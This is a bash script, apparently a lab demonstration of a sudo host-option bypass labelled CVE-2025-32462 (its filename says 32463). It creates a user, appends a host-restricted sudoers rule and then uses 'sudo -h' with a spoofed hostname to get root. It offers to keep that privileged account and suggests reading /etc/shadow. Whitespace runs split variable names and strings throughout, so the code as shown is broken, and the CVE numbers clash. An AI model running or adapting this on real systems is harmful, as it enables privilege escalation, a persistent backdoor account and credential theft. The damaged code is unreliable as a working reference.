#!/bin/bash

# CVE-2025-32462 eploit
# ./CVE-2025-32463_exploit.sh

set -euo pipefail

# Color Codes
GREEN="\033[1;32m"
RED="\033[1;31m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"
MAGENTA="\033[1;35m"
RESET="\033[0m"

# Config
MATRIX_USER="trinity"
ORIGINAL_HOSTNAME=$(hostname -f)  # Changed to -f for full hostname detection
VULN_HOSTNAME="zion-core"
RESTRICTED_HOSTNAME="matrix-node"

# Version Check Function
version_lt() {
  [ "$(printf '%s\n' "$1" "$2" | sort -V | head -n1)" != "$2" ]
}

# Step 1: Detect Vulnerability
echo -e "${BLUE}[*] Checking for CVE-2025-32462 vulnerability...${RESET}"

SUDO_VERSION=$(sudo --version | head -n1 | awk '{print $3}')
REQUIRED_VERSION="1.9.17"

if version_lt "$SUDO_VERSION" "$REQUIRED_VERSION"; then
  echo -e "${GREEN}[+] This system is VULNERABLE (sudo version $SUDO_VERSION < $                                                                             REQUIRED_VERSION)${RESET}"
  echo
  read -p "$(echo -e "${YELLOW}Do you want to proceed with the exploit demo? [y/                                                                             N]: ${RESET}")" CONT
  if [[ ! "$CONT" =~ ^[Yy]$ ]]; then
    echo -e "${RED}[-] Exiting as requested.${RESET}"
    exit 0
  fi
else
  echo -e "${RED}[-] This system is NOT vulnerable (sudo version $SUDO_VERSION ≥                                                                              $REQUIRED_VERSION)${RESET}"
  exit 0
fi

# Step 2: Create User
echo -e "${BLUE}[*] Creating demo user: $MATRIX_USER${RESET}"

read -s -p "$(echo -e "${YELLOW}Enter password for $MATRIX_USER: ${RESET}")" MAT                                                                             RIX_PASS
echo
read -s -p "$(echo -e "${YELLOW}Confirm password: ${RESET}")" MATRIX_PASS_CONFIR                                                                             M
echo

if [ "$MATRIX_PASS" != "$MATRIX_PASS_CONFIRM" ]; then
  echo -e "${RED}❌ Passwords do not match.${RESET}"
  exit 1
fi

sudo adduser --disabled-password --gecos "" "$MATRIX_USER"
echo "$MATRIX_USER:$MATRIX_PASS" | sudo chpasswd

# Step 3: Set vulnerable hostname
sudo hostnamectl set-hostname "$VULN_HOSTNAME"
echo -e "${BLUE}[+] Hostname temporarily set to: $(hostname)${RESET}"

# Step 4: Configure sudoers
echo -e "${BLUE}[*] Granting sudo access to $MATRIX_USER on $VULN_HOSTNAME...${R                                                                             ESET}"

SUDOERS_BACKUP="/tmp/sudoers.bak"
sudo cp /etc/sudoers "$SUDOERS_BACKUP"

echo -e "Host_Alias ZION = $VULN_HOSTNAME\nUser_Alias TRINITY = $MATRIX_USER\nTR                                                                             INITY ZION = (ALL) ALL" | sudo tee -a /etc/sudoers > /dev/null

# Step 5: Simulate restricted environment
echo -e "${BLUE}[*] Switching to restricted environment ($RESTRICTED_HOSTNAME)..                                                                             .${RESET}"
sudo hostnamectl set-hostname "$RESTRICTED_HOSTNAME"
echo -e "${BLUE}[+] Hostname changed to: $(hostname)${RESET}"

echo -e "${BLUE}[*] Confirming $MATRIX_USER can't run sudo on this host...${RESE                                                                             T}"
sudo -u "$MATRIX_USER" bash -c 'sudo whoami' || echo -e "${GREEN}[✔] Access deni                                                                             ed as expected.${RESET}"

# Step 6: Exploit with Privilege Escalation via Host Spoof
echo -e "${BLUE}[*] Running Exploit with Privilege Escalation...${RESET}"

echo -e "\n${YELLOW}Current hostname verification:${RESET}"
echo "Main hostname: $(hostname)"
echo "User view: $(sudo -u "$MATRIX_USER" hostname)"

echo -e "\n${BLUE}[*] Running exploit via spoofed hostname ($VULN_HOSTNAME)...${                                                                             RESET}"
EXPLOIT_OUTPUT=$(sudo -u "$MATRIX_USER" bash -c "echo '$MATRIX_PASS' | sudo -S -                                                                             h $VULN_HOSTNAME whoami 2>/dev/null")

if [ "$EXPLOIT_OUTPUT" == "root" ]; then
  echo -e "${MAGENTA}"
  echo "╔══════════════════════════════════════════════════╗"
  echo "║           EXPLOIT VERIFICATION SUCCESS!          ║"
  echo "╠══════════════════════════════════════════════════╣"
  echo "║ The system allowed root access by:               ║"
  echo "║ 1. Using -h to spoof hostname ($VULN_HOSTNAME)        ║"
  echo "║ 2. While actual hostname is $(printf '%-16s' $(hostname))     ║"
  echo "║                                                  ║"
  echo "║ This bypasses hostname restrictions in sudoers!  ║"
  echo "╚══════════════════════════════════════════════════╝"
  echo -e "${RESET}"

  echo -e "\n${GREEN}You are now a SUDOER:${RESET}"
  echo "Try:$ sudo -u $MATRIX_USER sudo -h $VULN_HOSTNAME id"
  echo "   :$ sudo -u $MATRIX_USER sudo -h cat /etc/shadow"
else
  echo -e "${RED}[-] Exploit verification failed - no root access obtained${RESE                                                                             T}"
fi

# Step 7: Cleanup or Keep
echo
read -p "$(echo -e "${YELLOW}Do you want to keep access for $MATRIX_USER (preser                                                                             ve user and sudoers)? [y/N]: ${RESET}")" KEEP

if [[ "$KEEP" =~ ^[Yy]$ ]]; then
  echo -e "${GREEN}[*] Keeping user $MATRIX_USER and sudo privileges.${RESET}"
  echo -e "${YELLOW}Warning: This maintains the vulnerable configuration!${RESET                                                                             }"
else
  echo -e "${BLUE}[*] Cleaning up...${RESET}"
  echo -e "${BLUE}[*] Restoring original hostname: $ORIGINAL_HOSTNAME${RESET}"
  sudo hostnamectl set-hostname "$ORIGINAL_HOSTNAME"
  sudo deluser --remove-home "$MATRIX_USER"
  sudo mv "$SUDOERS_BACKUP" /etc/sudoers
  sudo chmod 440 /etc/sudoers
  echo -e "${GREEN}[+] Hostname restored to: $(hostname -f)${RESET}"  # Changed                                                                              to -f for full hostname
  echo -e "${GREEN}[+] User and sudo access removed.${RESET}"
fi

echo -e "${GREEN}[✔] CVE-2025–32462 demonstration complete.${RESET}"
